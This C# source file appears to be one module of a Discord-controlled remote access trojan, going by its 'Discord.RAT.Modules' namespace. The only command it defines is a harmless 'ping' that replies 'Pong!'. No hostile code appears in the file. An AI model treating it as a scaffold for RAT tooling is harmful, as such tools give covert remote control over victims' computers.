using Discord.Commands;
using System;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Speech.Synthesis;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;

namespace Discord.RAT.Modules
{
    public class Ping : ModuleBase
    {

        [Command("ping", RunMode = RunMode.Async)]
        public async Task SendPing()
        {
            await ReplyAsync("Pong! " + Context.Message.Author.Mention);

        }

    }
}
